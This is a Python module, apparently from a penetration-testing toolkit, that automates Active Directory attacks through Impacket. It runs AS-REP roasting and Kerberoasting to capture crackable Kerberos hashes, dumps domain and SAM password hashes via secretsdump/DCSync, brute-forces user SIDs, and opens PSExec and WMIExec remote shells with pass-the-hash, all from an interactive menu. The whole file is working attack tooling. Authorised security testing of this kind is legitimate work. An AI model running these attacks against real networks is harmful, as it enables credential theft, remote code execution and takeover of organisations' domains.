#!/usr/bin/env python3
"""
Active Directory enumeration module for the Pentest Toolkit.
Handles Impacket tools and AD-specific enumeration.
"""

import re
from pathlib import Path
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass, field

import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from configs.config import check_tool_installed, RESULTS_DIR
from modules.utils import (
    OutputManager, CommandExecutor, CommandResult,
    print_section, print_success, print_error, print_warning, print_info,
    Colors
)


@dataclass
class ADEnumResult:
    """Result of Active Directory enumeration."""
    target: str
    domain: str = ""
    users: List[Dict] = field(default_factory=list)
    spn_users: List[Dict] = field(default_factory=list)
    asrep_users: List[Dict] = field(default_factory=list)
    hashes: List[str] = field(default_factory=list)
    tickets: List[str] = field(default_factory=list)
    raw_output: str = ""


class ADEnumerator:
    """Handles Active Directory enumeration with Impacket tools."""

    def __init__(
        self,
        target: str,
        domain: str,
        output_manager: Optional[OutputManager] = None
    ):
        self.target = target
        self.domain = domain
        self.output_manager = output_manager or OutputManager(RESULTS_DIR, target)
        self.executor = CommandExecutor(self.output_manager)

        # Check Impacket tools availability
        self.has_GetNPUsers = check_tool_installed("impacket-GetNPUsers")
        self.has_GetUserSPNs = check_tool_installed("impacket-GetUserSPNs")
        self.has_secretsdump = check_tool_installed("impacket-secretsdump")
        self.has_psexec = check_tool_installed("impacket-psexec")
        self.has_wmiexec = check_tool_installed("impacket-wmiexec")
        self.has_smbexec = check_tool_installed("impacket-smbexec")
        self.has_lookupsid = check_tool_installed("impacket-lookupsid")
        self.has_samrdump = check_tool_installed("impacket-samrdump")
        self.has_reg = check_tool_installed("impacket-reg")

        # Alternative tool names (some systems use different naming)
        if not self.has_GetNPUsers:
            self.has_GetNPUsers = check_tool_installed("GetNPUsers.py")
        if not self.has_GetUserSPNs:
            self.has_GetUserSPNs = check_tool_installed("GetUserSPNs.py")
        if not self.has_secretsdump:
            self.has_secretsdump = check_tool_installed("secretsdump.py")

    def _get_tool_cmd(self, tool_name: str) -> str:
        """Get the correct command for a tool."""
        impacket_name = f"impacket-{tool_name}"
        if check_tool_installed(impacket_name):
            return impacket_name
        script_name = f"{tool_name}.py"
        if check_tool_installed(script_name):
            return script_name
        return impacket_name  # Default to impacket- prefix

    def get_np_users(
        self,
        username: Optional[str] = None,
        password: Optional[str] = None,
        users_file: Optional[str] = None,
        no_pass: bool = True,
        request: bool = True,
        format_type: str = "hashcat",
        additional_args: Optional[List[str]] = None
    ) -> Tuple[ADEnumResult, CommandResult]:
        """
        Run GetNPUsers for AS-REP Roasting.

        Find users without Kerberos pre-authentication required.

        Args:
            username: Username for authentication
            password: Password for authentication
            users_file: File containing usernames to test
            no_pass: Use null authentication
            request: Request TGT for found users
            format_type: Output format (hashcat or john)
            additional_args: Additional arguments
        """
        if not self.has_GetNPUsers:
            print_error("Impacket GetNPUsers is not installed.")
            return ADEnumResult(self.target, self.domain), CommandResult("", -1, "", "GetNPUsers not installed", 0, False)

        print_section("AS-REP Roasting (GetNPUsers)")

        tool_cmd = self._get_tool_cmd("GetNPUsers")
        output_file = self.output_manager.get_output_path('ad', f"asrep_{self.domain}.txt")

        # Build target specification
        if username and password:
            target_spec = f"{self.domain}/{username}:{password}"
        elif username:
            target_spec = f"{self.domain}/{username}"
        else:
            target_spec = f"{self.domain}/"

        cmd_parts = [tool_cmd, target_spec, "-dc-ip", self.target]

        if no_pass and not password:
            cmd_parts.append("-no-pass")

        if request:
            cmd_parts.append("-request")

        if users_file:
            cmd_parts.extend(["-usersfile", users_file])

        if format_type == "hashcat":
            cmd_parts.append("-format hashcat")
        elif format_type == "john":
            cmd_parts.append("-format john")

        cmd_parts.extend(["-outputfile", str(output_file)])

        if additional_args:
            cmd_parts.extend(additional_args)

        command = " ".join(cmd_parts)
        result = self.executor.run(command, timeout=300, live_output=True)

        ad_result = ADEnumResult(target=self.target, domain=self.domain, raw_output=result.stdout)
        ad_result = self._parse_asrep_output(result.stdout, ad_result)

        if ad_result.asrep_users:
            print_success(f"Found {len(ad_result.asrep_users)} users vulnerable to AS-REP Roasting")

        return ad_result, result

    def _parse_asrep_output(self, output: str, result: ADEnumResult) -> ADEnumResult:
        """Parse GetNPUsers output."""
        # Pattern for AS-REP hash
        hash_pattern = r'\$krb5asrep\$[\d]*\$([^:]+)@[^:]+:[^:]+\$[a-fA-F0-9]+'

        for line in output.split('\n'):
            if '$krb5asrep$' in line:
                result.hashes.append(line.strip())
                match = re.search(hash_pattern, line)
                if match:
                    result.asrep_users.append({
                        'username': match.group(1),
                        'hash': line.strip()
                    })

        return result

    def get_user_spns(
        self,
        username: str,
        password: Optional[str] = None,
        hash_val: Optional[str] = None,
        request: bool = True,
        format_type: str = "hashcat",
        additional_args: Optional[List[str]] = None
    ) -> Tuple[ADEnumResult, CommandResult]:
        """
        Run GetUserSPNs for Kerberoasting.

        Find service accounts with SPNs and request TGS tickets.

        Args:
            username: Username for authentication (required)
            password: Password for authentication
            hash_val: NTLM hash for pass-the-hash
            request: Request TGS tickets
            format_type: Output format (hashcat or john)
            additional_args: Additional arguments
        """
        if not self.has_GetUserSPNs:
            print_error("Impacket GetUserSPNs is not installed.")
            return ADEnumResult(self.target, self.domain), CommandResult("", -1, "", "GetUserSPNs not installed", 0, False)

        print_section("Kerberoasting (GetUserSPNs)")

        tool_cmd = self._get_tool_cmd("GetUserSPNs")
        output_file = self.output_manager.get_output_path('ad', f"kerberoast_{self.domain}.txt")

        # Build target specification
        if password:
            target_spec = f"{self.domain}/{username}:{password}"
        else:
            target_spec = f"{self.domain}/{username}"

        cmd_parts = [tool_cmd, target_spec, "-dc-ip", self.target]

        if hash_val and not password:
            cmd_parts.extend(["-hashes", f":{hash_val}"])

        if request:
            cmd_parts.append("-request")

        if format_type == "hashcat":
            cmd_parts.append("-outputfile")
            cmd_parts.append(str(output_file))

        if additional_args:
            cmd_parts.extend(additional_args)

        command = " ".join(cmd_parts)
        result = self.executor.run(command, timeout=300, live_output=True)

        ad_result = ADEnumResult(target=self.target, domain=self.domain, raw_output=result.stdout)
        ad_result = self._parse_kerberoast_output(result.stdout, ad_result)

        if ad_result.spn_users:
            print_success(f"Found {len(ad_result.spn_users)} Kerberoastable accounts")

        return ad_result, result

    def _parse_kerberoast_output(self, output: str, result: ADEnumResult) -> ADEnumResult:
        """Parse GetUserSPNs output."""
        # Pattern for SPN accounts
        spn_pattern = r'(\S+)\s+(\S+)\s+(\S+)\s+(\d{4}-\d{2}-\d{2})\s+(\S+)'

        in_table = False
        for line in output.split('\n'):
            if 'ServicePrincipalName' in line:
                in_table = True
                continue
            if in_table and line.strip():
                if '$krb5tgs$' in line:
                    result.hashes.append(line.strip())
                    result.tickets.append(line.strip())
                else:
                    parts = line.split()
                    if len(parts) >= 3:
                        result.spn_users.append({
                            'spn': parts[0],
                            'username': parts[1] if len(parts) > 1 else '',
                            'delegation': parts[2] if len(parts) > 2 else ''
                        })

        return result

    def secretsdump(
        self,
        username: str,
        password: Optional[str] = None,
        hash_val: Optional[str] = None,
        just_dc: bool = False,
        just_dc_ntlm: bool = False,
        sam: bool = False,
        additional_args: Optional[List[str]] = None
    ) -> Tuple[ADEnumResult, CommandResult]:
        """
        Run secretsdump to extract secrets.

        Args:
            username: Username for authentication (required)
            password: Password for authentication
            hash_val: NTLM hash for pass-the-hash
            just_dc: Extract only NTDS.DIT secrets (DCSync)
            just_dc_ntlm: Extract only NTLM hashes from DC
            sam: Extract local SAM secrets
            additional_args: Additional arguments
        """
        if not self.has_secretsdump:
            print_error("Impacket secretsdump is not installed.")
            return ADEnumResult(self.target, self.domain), CommandResult("", -1, "", "secretsdump not installed", 0, False)

        print_section("Secrets Dump")

        tool_cmd = self._get_tool_cmd("secretsdump")
        output_file = self.output_manager.get_output_path('ad', f"secretsdump_{self.target.replace('.', '_')}.txt")

        # Build target specification
        if password:
            target_spec = f"{self.domain}/{username}:{password}@{self.target}"
        else:
            target_spec = f"{self.domain}/{username}@{self.target}"

        cmd_parts = [tool_cmd, target_spec]

        if hash_val and not password:
            cmd_parts.extend(["-hashes", f":{hash_val}"])

        if just_dc:
            cmd_parts.append("-just-dc")
        elif just_dc_ntlm:
            cmd_parts.append("-just-dc-ntlm")

        if sam:
            cmd_parts.append("-sam")

        cmd_parts.extend(["-outputfile", str(output_file)])

        if additional_args:
            cmd_parts.extend(additional_args)

        command = " ".join(cmd_parts)
        result = self.executor.run(command, timeout=600, live_output=True)

        ad_result = ADEnumResult(target=self.target, domain=self.domain, raw_output=result.stdout)

        # Parse hashes
        for line in result.stdout.split('\n'):
            if ':::' in line or ':aad3b435b51404eeaad3b435b51404ee:' in line:
                ad_result.hashes.append(line.strip())

        if ad_result.hashes:
            print_success(f"Extracted {len(ad_result.hashes)} hashes")

        return ad_result, result

    def lookupsid(
        self,
        username: Optional[str] = None,
        password: Optional[str] = None,
        max_rid: int = 4000
    ) -> Tuple[ADEnumResult, CommandResult]:
        """
        Enumerate domain users via SID bruteforcing.

        Args:
            username: Username for authentication
            password: Password for authentication
            max_rid: Maximum RID to enumerate
        """
        if not self.has_lookupsid:
            print_error("Impacket lookupsid is not installed.")
            return ADEnumResult(self.target, self.domain), CommandResult("", -1, "", "lookupsid not installed", 0, False)

        print_section("SID Lookup (User Enumeration)")

        tool_cmd = self._get_tool_cmd("lookupsid")
        output_file = self.output_manager.get_output_path('ad', f"lookupsid_{self.domain}.txt")

        # Build target specification
        if username and password:
            target_spec = f"{self.domain}/{username}:{password}@{self.target}"
        elif username:
            target_spec = f"{self.domain}/{username}@{self.target}"
        else:
            target_spec = f"{self.domain}/guest@{self.target}"

        cmd_parts = [tool_cmd, target_spec, str(max_rid)]

        command = " ".join(cmd_parts)
        result = self.executor.run(command, timeout=300, live_output=True)

        # Save output
        self.output_manager.save_output('ad', f"lookupsid_{self.domain}.txt", result.stdout)

        ad_result = ADEnumResult(target=self.target, domain=self.domain, raw_output=result.stdout)

        # Parse users
        user_pattern = r'(\d+):\s+(\S+)\s+\(SidTypeUser\)'
        for match in re.finditer(user_pattern, result.stdout):
            ad_result.users.append({
                'rid': match.group(1),
                'username': match.group(2).split('\\')[-1]
            })

        if ad_result.users:
            print_success(f"Found {len(ad_result.users)} domain users")

        return ad_result, result

    def psexec(
        self,
        username: str,
        password: Optional[str] = None,
        hash_val: Optional[str] = None,
        command: Optional[str] = None
    ) -> CommandResult:
        """
        Execute commands via PSExec.

        Args:
            username: Username for authentication
            password: Password for authentication
            hash_val: NTLM hash for pass-the-hash
            command: Command to execute (None for interactive shell)
        """
        if not self.has_psexec:
            print_error("Impacket psexec is not installed.")
            return CommandResult("", -1, "", "psexec not installed", 0, False)

        print_section("PSExec Remote Execution")

        tool_cmd = self._get_tool_cmd("psexec")

        # Build target specification
        if password:
            target_spec = f"{self.domain}/{username}:{password}@{self.target}"
        else:
            target_spec = f"{self.domain}/{username}@{self.target}"

        cmd_parts = [tool_cmd, target_spec]

        if hash_val and not password:
            cmd_parts.extend(["-hashes", f":{hash_val}"])

        if command:
            cmd_parts.append(command)

        cmd = " ".join(cmd_parts)

        if command:
            return self.executor.run(cmd, timeout=120, live_output=True)
        else:
            print_info("Starting interactive shell...")
            print_warning("Use 'exit' to close the shell")
            return self.executor.run(cmd, timeout=3600, live_output=True)

    def wmiexec(
        self,
        username: str,
        password: Optional[str] = None,
        hash_val: Optional[str] = None,
        command: Optional[str] = None
    ) -> CommandResult:
        """Execute commands via WMI."""
        if not self.has_wmiexec:
            print_error("Impacket wmiexec is not installed.")
            return CommandResult("", -1, "", "wmiexec not installed", 0, False)

        print_section("WMI Remote Execution")

        tool_cmd = self._get_tool_cmd("wmiexec")

        if password:
            target_spec = f"{self.domain}/{username}:{password}@{self.target}"
        else:
            target_spec = f"{self.domain}/{username}@{self.target}"

        cmd_parts = [tool_cmd, target_spec]

        if hash_val and not password:
            cmd_parts.extend(["-hashes", f":{hash_val}"])

        if command:
            cmd_parts.append(command)

        cmd = " ".join(cmd_parts)
        return self.executor.run(cmd, timeout=3600 if not command else 120, live_output=True)

    def ad_full_enum(
        self,
        username: Optional[str] = None,
        password: Optional[str] = None,
        hash_val: Optional[str] = None,
        users_file: Optional[str] = None
    ) -> Dict[str, ADEnumResult]:
        """
        Run comprehensive AD enumeration.

        Args:
            username: Username for authentication
            password: Password for authentication
            hash_val: NTLM hash for pass-the-hash
            users_file: File containing usernames for AS-REP roasting
        """
        print_section(f"Full AD Enumeration: {self.domain}")

        results = {}

        # SID Lookup for user enumeration
        if self.has_lookupsid:
            print_info("Enumerating users via SID lookup...")
            results['lookupsid'], _ = self.lookupsid(username, password)

        # AS-REP Roasting (can work without creds)
        if self.has_GetNPUsers:
            print_info("Checking for AS-REP Roastable users...")
            results['asrep'], _ = self.get_np_users(
                username=username,
                password=password,
                users_file=users_file
            )

        # Kerberoasting (requires valid creds)
        if self.has_GetUserSPNs and username:
            print_info("Checking for Kerberoastable accounts...")
            results['kerberoast'], _ = self.get_user_spns(
                username=username,
                password=password,
                hash_val=hash_val
            )

        self._print_ad_summary(results)
        return results

    def _print_ad_summary(self, results: Dict[str, ADEnumResult]):
        """Print AD enumeration summary."""
        print_section("AD Enumeration Summary")

        for tool, result in results.items():
            print(f"\n{Colors.BOLD}{tool.upper()}{Colors.RESET}")
            print("-" * 40)

            if result.users:
                print(f"  Users Found: {len(result.users)}")
                for user in result.users[:10]:
                    print(f"    - {user.get('username', '?')}")
                if len(result.users) > 10:
                    print(f"    ... and {len(result.users) - 10} more")

            if result.asrep_users:
                print(f"  AS-REP Roastable: {len(result.asrep_users)}")
                for user in result.asrep_users:
                    print(f"    - {user.get('username', '?')}")

            if result.spn_users:
                print(f"  Kerberoastable: {len(result.spn_users)}")
                for user in result.spn_users:
                    print(f"    - {user.get('username', '?')} ({user.get('spn', '?')})")

            if result.hashes:
                print(f"  Hashes Captured: {len(result.hashes)}")


def run_ad_menu(target: str, domain: str) -> Optional[Dict[str, ADEnumResult]]:
    """Interactive menu for AD enumeration."""
    from modules.utils import print_banner

    print_banner()

    print_section(f"AD Enumeration: {domain} @ {target}")

    # Get credentials
    print("\nCredentials:")
    username = input("  Username: ").strip() or None
    password = None
    hash_val = None

    if username:
        auth_type = input("  [P]assword or [H]ash? ").strip().lower()
        if auth_type == 'p':
            password = input("  Password: ").strip() or None
        elif auth_type == 'h':
            hash_val = input("  NTLM Hash: ").strip() or None

    enumerator = ADEnumerator(target, domain)

    options = [
        ("1", "AS-REP Roasting (no auth)", lambda: enumerator.get_np_users()),
        ("2", "AS-REP Roasting (with creds)", lambda: enumerator.get_np_users(username, password)),
        ("3", "Kerberoasting", lambda: enumerator.get_user_spns(username, password, hash_val)),
        ("4", "SID Lookup (User Enum)", lambda: enumerator.lookupsid(username, password)),
        ("5", "Secrets Dump (DCSync)", lambda: enumerator.secretsdump(username, password, hash_val, just_dc=True)),
        ("6", "Secrets Dump (SAM)", lambda: enumerator.secretsdump(username, password, hash_val, sam=True)),
        ("7", "Full AD Enumeration", lambda: enumerator.ad_full_enum(username, password, hash_val)),
        ("8", "PSExec Shell", lambda: enumerator.psexec(username, password, hash_val)),
        ("9", "WMIExec Shell", lambda: enumerator.wmiexec(username, password, hash_val)),
        ("0", "Back to Main Menu", None),
    ]

    print("\nSelect action:")
    for key, name, _ in options:
        print(f"  [{key}] {name}")

    choice = input(f"\n{Colors.CYAN}Enter choice: {Colors.RESET}").strip()

    for key, name, func in options:
        if choice == key:
            if func is None:
                return None
            print_info(f"Starting {name}...")
            result = func()
            if isinstance(result, tuple):
                return {name: result[0]}
            return result

    print_error("Invalid choice")
    return None


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python ad_enum.py <target_ip> <domain>")
        sys.exit(1)

    target = sys.argv[1]
    domain = sys.argv[2]
    run_ad_menu(target, domain)
